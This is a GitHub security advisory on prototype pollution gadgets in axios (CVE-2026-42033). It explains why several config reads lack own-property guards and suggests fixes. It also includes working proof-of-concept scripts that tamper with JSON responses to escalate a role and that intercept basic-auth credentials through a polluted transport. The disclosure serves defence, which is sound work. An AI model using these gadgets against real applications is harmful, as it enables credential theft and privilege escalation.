# [H] Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking

## Summary
Severity: High
Advisory: GHSA-pf86-5x62-jrwf
CVE: CVE-2026-42033
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-pf86-5x62-jrwf
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.1
- npm: `axios` — affected >=0 <0.31.1

## Details
## Summary

When `Object.prototype` has been polluted by any co-dependency with keys that axios reads without a `hasOwnProperty` guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process -- lodash < 4.17.21, or any of several other common npm packages with known PP vectors. The two gadgets confirmed here work independently.

---

## Background: how mergeConfig builds the config object

Every axios request goes through `Axios._request` in [`lib/core/Axios.js#L76`](https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L76):

```js
config = mergeConfig(this.defaults, config);
```

Inside `mergeConfig`, the merged config is built as a plain `{}` object ([`lib/core/mergeConfig.js#L20`](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L20)):

```js
const config = {};
```

A plain `{}` inherits from `Object.prototype`. `mergeConfig` only iterates `Object.keys({ ...config1, ...config2 })` ([line 99](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99)), which is a spread of own properties. Any key that is absent from both `this.defaults` and the per-request config will never be set as an own property on the merged config. Reading that key later on the merged config falls through to `Object.prototype`. That is the root mechanism behind all gadgets below.

---

## Gadget 1: parseReviver -- response tampering and exfiltration

**Introduced in:** v1.12.0 (commit 2a97634, PR #5926)
**Affected range:** >= 1.12.0, <= 1.13.6

### Root cause

The default `transformResponse` function calls [`JSON.parse(data, this.parseReviver)`](https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124):

```js
return JSON.parse(data, this.parseReviver);
```

`this` is the merged config. `parseReviver` is not present in `defaults` and is not in the `mergeMap` inside `mergeConfig`. It is never set as an own property on the merged config. Accessing `this.parseReviver` therefore walks the prototype chain.

The call fires by default on every string response body because [`lib/defaults/transitional.js#L5`](https://github.com/axios/axios/blob/v1.13.6/lib/defaults/transitional.js#L5) sets:

```js
forcedJSONParsing: true,
```

which activates the JSON parse path unconditionally when `responseType` is unset.

`JSON.parse(text, reviver)` calls the reviver for every key-value pair in the parsed result, bottom-up. The reviver's return value is what the caller receives. An attacker-controlled reviver can both observe every key-value pair and silently replace values.

There is no interaction with `assertOptions` here. The `assertOptions` call in `Axios._request` ([line 119](https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119)) iterates `Object.keys(config)`, and since `parseReviver` was never set as an own property, it is not in that list. Nothing validates or invokes the polluted function before `transformResponse` does.

### Verification: own-property check

```js
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const mergeConfig = require('./lib/core/mergeConfig.js').default;
const defaults = require('./lib/defaults/index.js').default;

const merged = mergeConfig(defaults, { url: '/test', method: 'get' });
console.log(Object.prototype.hasOwnProperty.call(merged, 'parseReviver')); // false
console.log(merged.parseReviver); // undefined (no pollution)

Object.prototype.parseReviver = function(k, v) { return v; };
console.log(merged.parseReviver); // [Function (anonymous)] -- inherited
delete Object.prototype.parseReviver;
```

### Proof of concept

Two terminals. The server simulates a legitimate API endpoint. The client simulates a Node.js application whose process has been affected by prototype pollution from a co-dependency.

**Terminal 1 -- server (`server_gadget1.mjs`):**

```js
import http from 'http';

const server = http.createServer((req, res) => {
  console.log('[server] request:', req.method, req.url);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ role: 'user', balance: 100, token: 'tok_real_abc' }));
});

server.listen(19003, '127.0.0.1', () => {
  console.log('[server] listening on 127.0.0.1:19003');
});
```

```
$ node server_gadget1.mjs
[server] listening on 127.0.0.1:19003
[server] request: GET /
```

**Terminal 2 -- client (`poc_parsereviver.mjs`):**

```js
import axios from 'axios';

// Simulate pollution arriving from a co-dependency (e.g. lodash < 4.17.21 via _.merge).
// In a real application this would be set before any axios request runs.
Object.prototype.parseReviver = function (key, value) {
  // Called for every key-value pair in every JSON response parsed by axios in this process.
  if (key !== '') {
    // Exfiltrate: in a real attack this would POST to an attacker-controlled endpoint.
    console.log('[exfil]', key, '=', JSON.stringify(value));
  }
  // Tamper: escalate role, inflate balance.
  if (key === 'role') return 'admin';
  if (key === 'balance') return 999999;
  return value;
};

const res = await axios.get('http://127.0.0.1:19003/');
console.log('[app] received:', JSON.stringify(res.data));

delete Object.prototype.parseReviver;
```

```
$ node poc_parsereviver.mjs
[exfil] role = "user"
[exfil] balance = 100
[exfil] token = "tok_real_abc"
[app] received: {"role":"admin","balance":999999,"token":"tok_real_abc"}
```

The server sent `role: user`. The application received `role: admin`. The response is silently modified in place; no error is thrown, no log entry is produced.

---

## Gadget 2: transport -- full HTTP request hijacking with credentials

**Introduced in:** early adapter refactor, present across 0.x and 1.x
**Affected range:** >= 0.19.0, <= 1.13.6 (Node.js http adapter only)

### Root cause

Inside the Node.js http adapter at [`lib/adapters/http.js#L676`](https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676):

```js
if (config.transport) {
  transport = config.transport;
}
```

`transport` is listed in `mergeMap` inside `mergeConfig` ([line 88](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L88)):

```js
transport: defaultToConfig2,
```

but it is not present in [`lib/defaults/index.js`](https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js) at all. `mergeConfig` iterates `Object.keys({ ...config1, ...config2 })` ([line 99](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99)). Since `config1` (the defaults) has no `transport` key and a typical per-request config has none either, the key never enters the loop. It is never set as an own property on the merged config. The read at line 676 falls through to `Object.prototype`.

The fix in v1.13.5 (PR #7369) added a `hasOwnProp` check for `mergeMap` access, but the iteration set itself is the issue -- `transport` simply never enters it. The fix does not address this.

The transport interface is `{ request(options, handleResponseCallback) }`. The options object passed to `transport.request` at adapter runtime contains:

- `options.hostname`, `options.port`, `options.path` -- full target URL
- `options.auth` -- basic auth credentials in `"username:password"` form (set at [line 606](https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L606))
- `options.headers` -- all request headers as a plain object

### Proof of concept

Two terminals. The server is a legitimate API endpoint that processes the request normally. The client's process has been affected by prototype pollution.

**Terminal 1 -- server (`server_gadget2.mjs`):**

```js
import http from 'http';

const server = http.createServer((req, res) => {
  console.log('[server] request:', req.method, req.url, 'auth:', req.headers.authorization || '(none)');
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end('{"ok":true}');
});

server.listen(19002, '127.0.0.1', () => {
  console.log('[server] listening on 127.0.0.1:19002');
});
```

```
$ node server_gadget2.mjs
[server] listening on 127.0.0.1:19002
[server] request: GET /api/users auth: Basic c3ZjX2FjY291bnQ6aHVudGVyMg==
```

**Terminal 2 -- client (`poc_transport.mjs`):**

```js
import axios from 'axios';
import http from 'http';

Object.prototype.transport = {
  request(options, handleResponse) {
    // Intercept: called for every outbound request in this process.
    console.log('[hijack] target:', options.hostname + ':' + options.port + options.path);
    console.log('[hijack] auth:', options.auth);
    console.log('[hijack] headers:', JSON.stringify(options.headers));
    // Forward to the real transport so the caller sees a normal 200.
    return http.request(options, handleResponse);
  },
};

const res = await axios.get('http://127.0.0.1:19002/api/users', {
  auth: { username: 'svc_account', password: 'hunter2' },
});
console.log('[app] response status:', res.status);

delete Object.prototype.transport;
```

```
$ node poc_transport.mjs
[hijack] target: 127.0.0.1:19002/api/users
[hijack] auth: svc_account:hunter2
[hijack] headers: {"Accept":"application/json, text/plain, */*","User-Agent":"axios/1.13.6","Accept-Encoding":"gzip, compress, deflate, br"}
[app] response status: 200
```

The basic auth credentials are fully visible to the attacker's transport function. The request completes normally from the caller's perspective.

---

## Additional gadget: transformRequest / transformResponse

Separately, `mergeConfig` reads `config2[prop]` at [line 102](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102) without a `hasOwnProperty` guard. For keys like `transformRequest` and `transformResponse` that are present in `defaults` (and therefore processed by the mergeMap loop), if `Object.prototype.transformRequest` is polluted before the request, `config2["transformRequest"]` inherits the polluted value and `defaultToConfig2` replaces the safe default transforms with the attacker's function.

This one requires a discriminator because `assertOptions` in `Axios._request` ([line 119](https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119)) reads `schema[opt]` for every key in the merged config's own keys, and `schema["transformRequest"]` also inherits from `Object.prototype`, causing it to call the polluted value as a validator. The gadget function needs to return `true` when its first argument is a function (the assertOptions call) and perform the attack when its first argument is data (the [`transformData`](https://github.com/axios/axios/blob/v1.13.6/lib/core/transformData.js#L22) call).

Both `transformRequest` (fires with request body) and `transformResponse` (fires with response body) are confirmed affected. Range: >= 0.19.0, <= 1.13.6.

---

## Why the existing fix does not cover these

PR #7369 / CVE-2026-25639 (fixed in v1.13.5) addressed a separate class: passing `{"__proto__": {"x": 1}}` as the config object, which caused `mergeMap['__proto__']` to resolve to `Object.prototype` (a non-function), crashing axios. The fix added an explicit block on `__proto__`, `constructor`, and `prototype` as config keys, and changed `mergeMap[prop]` to `utils.hasOwnProp(mergeMap, prop) ? mergeMap[prop] : ...`.

That fix only addresses config keys that are explicitly set to `__proto__` (or similar) by the caller. It does not add `hasOwnProperty` guards on the value reads (`config2[prop]` at [line 102](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102), `this.parseReviver`, `config.transport`). An application using a PP-vulnerable co-dependency and making axios requests is still fully exposed after upgrading to 1.13.5 or 1.13.6.

---

## Suggested fixes

For `parseReviver` ([`lib/defaults/index.js#L124`](https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124)):
```js
const reviver = Object.prototype.hasOwnProperty.call(this, 'parseReviver') ? this.parseReviver : undefined;
return JSON.parse(data, reviver);
```

For `mergeConfig` value reads ([`lib/core/mergeConfig.js#L102`](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102)):
```js
const configValue = merge(
  config1[prop],
  utils.hasOwnProp(config2, prop) ? config2[prop] : undefined,
  prop
);
```

For `transport` and other adapter reads from config ([`lib/adapters/http.js#L676`](https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676)):
```js
if (utils.hasOwnProp(config, 'transport') && config.transport) {
  transport = config.transport;
}
```

The same `hasOwnProp` pattern applies to `lookup`, `httpVersion`, `http2Options`, `family`, and `formSerializer` reads in the adapter.

---

## Environment

- axios: 1.13.6
- Node.js: 22.22.0
- OS: macOS 14
- Reproduction: confirmed in isolated test harness, both gadgets independently verified

## Disclosure

Reported via GitHub Security Advisories at https://github.com/axios/axios/security/advisories/new per the axios security policy.

## References
- https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf
- https://nvd.nist.gov/vuln/detail/CVE-2026-42033
- https://github.com/axios/axios
